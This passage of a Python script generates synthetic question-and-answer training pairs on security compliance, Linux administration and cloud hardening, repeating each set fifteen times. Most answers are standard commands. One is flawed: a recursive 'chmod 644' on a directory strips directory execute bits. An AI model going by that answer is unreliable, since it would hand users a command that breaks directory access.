        ("How do I implement least privilege?", "```bash\n# Linux - specific sudo commands\nuser ALL=(ALL) /usr/bin/systemctl restart nginx\n# AWS IAM policy\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\"s3:GetObject\"],\n  \"Resource\": \"arn:aws:s3:::bucket/prefix/*\"\n}\n```\n\nPrinciples:\n- Default deny\n- Grant minimum required permissions\n- Time-bound access\n- Regular access reviews\n- Separate duty roles"),

        # Compliance
        ("What is OWASP Top 10?", "OWASP Top 10 (2021):\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable Components\n7. Authentication Failures\n8. Data Integrity Failures\n9. Logging Failures\n10. SSRF\n\nMitigations: Input validation, access controls, secure defaults, dependency scanning, logging, encryption."),
        ("What is PCI DSS?", "PCI DSS requirements for payment card handling:\n1. Install and maintain firewall\n2. No vendor-supplied defaults\n3. Protect stored cardholder data\n4. Encrypt transmission\n5. Protect against malware\n6. Develop secure systems\n7. Restrict access to need-to-know\n8. Identify and authenticate access\n9. Restrict physical access\n10. Track and monitor access\n11. Test security regularly\n12. Maintain security policy"),
    ]
    return pairs


def download_cybersecurity_qa() -> List[Tuple[str, str]]:
    """Download cybersecurity Q&A from available sources."""
    cache_file = CACHE_DIR / "security_qa.json"

    if cache_file.exists():
        print("Loading cached security Q&A...")
        with open(cache_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return [(d[0], d[1]) for d in data]

    print("Generating security Q&A dataset...")
    pairs = []

    # Combine all generated data
    pairs.extend(generate_network_security_ops())
    pairs.extend(generate_penetration_testing())
    pairs.extend(generate_incident_response())
    pairs.extend(generate_system_hardening())
    pairs.extend(generate_cryptography())
    pairs.extend(generate_security_best_practices())

    # Cache the data
    with open(cache_file, 'w', encoding='utf-8') as f:
        json.dump(pairs, f, indent=2)

    print(f"Generated {len(pairs)} security training pairs")
    return pairs


def generate_linux_sysadmin() -> List[Tuple[str, str]]:
    """Generate Linux system administration training data."""
    pairs = [
        # Process management
        ("How do I find a process by name?", "```bash\nps aux | grep process_name\npgrep -a process_name\npidof process_name\n```"),
        ("How do I kill a process?", "```bash\nkill PID\nkill -9 PID  # Force kill\nkillall process_name\npkill -f pattern\n```"),
        ("How do I see process tree?", "```bash\npstree -p\nps auxf\nhtop  # Interactive\n```"),
        ("How do I check system resources?", "```bash\ntop\nhtop\nfree -h  # Memory\ndf -h    # Disk\ndu -sh * # Directory sizes\niostat   # I/O stats\nvmstat   # Virtual memory\n```"),

        # Service management
        ("How do I manage systemd services?", "```bash\nsystemctl start service\nsystemctl stop service\nsystemctl restart service\nsystemctl status service\nsystemctl enable service  # Start on boot\nsystemctl disable service\nsystemctl list-units --type=service\njournalctl -u service -f  # Follow logs\n```"),
        ("How do I check service logs?", "```bash\njournalctl -u service_name\njournalctl -u service_name --since '1 hour ago'\njournalctl -u service_name -f  # Follow\ntail -f /var/log/syslog\n```"),

        # User management
        ("How do I add a user in Linux?", "```bash\nuseradd -m -s /bin/bash username\npasswd username\nusermod -aG sudo username  # Add to sudo group\n```"),
        ("How do I manage user groups?", "```bash\ngroupadd groupname\nusermod -aG groupname username\ngroups username\nid username\ngpasswd -d username groupname  # Remove from group\n```"),
        ("How do I set file permissions?", "```bash\nchmod 755 file  # rwxr-xr-x\nchmod u+x file  # Add execute for owner\nchmod -R 644 directory/\nchown user:group file\nchown -R user:group directory/\n```"),

        # Disk and storage
        ("How do I mount a disk?", "```bash\n# List disks\nlsblk\nfdisk -l\n# Mount\nmount /dev/sdb1 /mnt/data\n# Permanent mount - add to /etc/fstab\nUUID=xxx /mnt/data ext4 defaults 0 2\n# Unmount\numount /mnt/data\n```"),
        ("How do I create a partition?", "```bash\nfdisk /dev/sdb\n# Commands: n (new), p (primary), w (write)\n# Or use parted\nparted /dev/sdb mklabel gpt\nparted /dev/sdb mkpart primary ext4 0% 100%\nmkfs.ext4 /dev/sdb1\n```"),
        ("How do I check disk health?", "```bash\nsmartctl -a /dev/sda\nsmartctl -t short /dev/sda\nbadblocks -v /dev/sda\n```"),

        # Networking
        ("How do I configure a static IP?", "```bash\n# Netplan (Ubuntu)\nvim /etc/netplan/01-config.yaml\nnetwork:\n  ethernets:\n    eth0:\n      addresses: [192.168.1.100/24]\n      gateway4: 192.168.1.1\n      nameservers:\n        addresses: [8.8.8.8, 8.8.4.4]\nnetplan apply\n```"),
        ("How do I troubleshoot network issues?", "```bash\nping google.com\ntraceroute google.com\ndig google.com\nnslookup google.com\nnetstat -tuln\nss -tuln\nip addr\nip route\ncurl -v https://example.com\n```"),
        ("How do I configure DNS?", "```bash\n# Edit resolv.conf\nvim /etc/resolv.conf\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n# Or use systemd-resolved\nvim /etc/systemd/resolved.conf\nDNS=8.8.8.8\nsystemctl restart systemd-resolved\n```"),

        # Backup and recovery
        ("How do I create backups?", "```bash\n# tar backup\ntar -czvf backup.tar.gz /path/to/backup\n# rsync incremental\nrsync -avz --delete /source/ /backup/\n# dd disk image\ndd if=/dev/sda of=/backup/disk.img bs=4M status=progress\n```"),
        ("How do I schedule tasks with cron?", "```bash\ncrontab -e\n# Format: minute hour day month weekday command\n0 2 * * * /backup.sh  # Daily at 2 AM\n*/15 * * * * /check.sh  # Every 15 minutes\n0 0 * * 0 /weekly.sh  # Weekly on Sunday\n```"),
        ("How do I restore from backup?", "```bash\n# tar restore\ntar -xzvf backup.tar.gz -C /restore/\n# rsync restore\nrsync -avz /backup/ /target/\n# dd restore\ndd if=/backup/disk.img of=/dev/sda bs=4M status=progress\n```"),
    ]
    return pairs


def generate_cloud_security() -> List[Tuple[str, str]]:
    """Generate cloud security training data."""
    pairs = [
        # AWS Security
        ("How do I secure an AWS account?", "1. Enable MFA on root account\n2. Create IAM users (don't use root)\n3. Enable CloudTrail logging\n4. Enable GuardDuty\n5. Use Security Hub\n6. Enable Config rules\n\n```bash\n# Enable MFA\naws iam enable-mfa-device --user-name user --serial-number arn:aws:iam::123456789:mfa/user --authentication-code1 123456 --authentication-code2 654321\n# Create admin user\naws iam create-user --user-name admin\naws iam attach-user-policy --user-name admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```"),
        ("How do I audit AWS permissions?", "```bash\n# List user policies\naws iam list-attached-user-policies --user-name user\naws iam list-user-policies --user-name user\n# Check role permissions\naws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789:role/role --action-names s3:GetObject\n# Access Analyzer\naws accessanalyzer list-findings\n```"),
        ("How do I encrypt S3 buckets?", "```bash\n# Enable default encryption\naws s3api put-bucket-encryption --bucket mybucket --server-side-encryption-configuration '{\"Rules\": [{\"ApplyServerSideEncryptionByDefault\": {\"SSEAlgorithm\": \"AES256\"}}]}'\n# Block public access\naws s3api put-public-access-block --bucket mybucket --public-access-block-configuration \"BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true\"\n```"),

        # Container security
        ("How do I scan container images?", "```bash\n# Trivy\ntrivy image myimage:latest\ntrivy image --severity HIGH,CRITICAL myimage:latest\n# Grype\ngrype myimage:latest\n# Anchore\nanchore-cli image add myimage:latest\nanchore-cli image vuln myimage:latest all\n```"),
        ("How do I secure a container runtime?", "```bash\n# Docker daemon config /etc/docker/daemon.json\n{\n  \"userns-remap\": \"default\",\n  \"no-new-privileges\": true,\n  \"seccomp-profile\": \"/etc/docker/seccomp.json\",\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\"max-size\": \"10m\", \"max-file\": \"3\"}\n}\n# Run with security options\ndocker run --security-opt=no-new-privileges --cap-drop=ALL --read-only image\n```"),

        # Infrastructure as Code security
        ("How do I scan Terraform for security issues?", "```bash\n# tfsec\ntfsec .\n# checkov\ncheckov -d .\n# terrascan\nterrascan scan -d .\n# Snyk\nsnyk iac test .\n```"),
        ("How do I secure Terraform state?", "```hcl\n# Backend with encryption\nterraform {\n  backend \"s3\" {\n    bucket         = \"terraform-state\"\n    key            = \"state/terraform.tfstate\"\n    region         = \"us-east-1\"\n    encrypt        = true\n    dynamodb_table = \"terraform-locks\"\n  }\n}\n```\n\n- Enable versioning on S3 bucket\n- Use DynamoDB for state locking\n- Restrict access with IAM\n- Never commit state files to git"),
    ]
    return pairs


def get_all_security_data() -> List[Tuple[str, str]]:
    """Get all security training data."""
    all_data = []

    # Network security operations
    network_sec = generate_network_security_ops()
    for _ in range(15):
        all_data.extend(network_sec)
    print(f"Network security: {len(network_sec)} * 15 = {len(network_sec) * 15} pairs")

    # Penetration testing
    pentest = generate_penetration_testing()
    for _ in range(15):
        all_data.extend(pentest)
    print(f"Penetration testing: {len(pentest)} * 15 = {len(pentest) * 15} pairs")

    # Incident response
    ir = generate_incident_response()
    for _ in range(15):
        all_data.extend(ir)
    print(f"Incident response: {len(ir)} * 15 = {len(ir) * 15} pairs")

    # System hardening
    hardening = generate_system_hardening()
    for _ in range(15):
        all_data.extend(hardening)
    print(f"System hardening: {len(hardening)} * 15 = {len(hardening) * 15} pairs")

    # Cryptography
    crypto = generate_cryptography()
    for _ in range(15):
        all_data.extend(crypto)
    print(f"Cryptography: {len(crypto)} * 15 = {len(crypto) * 15} pairs")

    # Security best practices
    best_practices = generate_security_best_practices()
    for _ in range(15):
        all_data.extend(best_practices)
    print(f"Security best practices: {len(best_practices)} * 15 = {len(best_practices) * 15} pairs")

    # Linux sysadmin
    sysadmin = generate_linux_sysadmin()
    for _ in range(15):
        all_data.extend(sysadmin)
    print(f"Linux sysadmin: {len(sysadmin)} * 15 = {len(sysadmin) * 15} pairs")

    # Cloud security
    cloud = generate_cloud_security()
    for _ in range(15):
        all_data.extend(cloud)
    print(f"Cloud security: {len(cloud)} * 15 = {len(cloud) * 15} pairs")

    print(f"\nTotal security training pairs: {len(all_data)}")
    return all_data


if __name__ == "__main__":
    data = get_all_security_data()

    # Save to cache
    cache_file = CACHE_DIR / "security_training_data.json"
    with open(cache_file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

    print(f"\nSaved {len(data)} training pairs to {cache_file}")
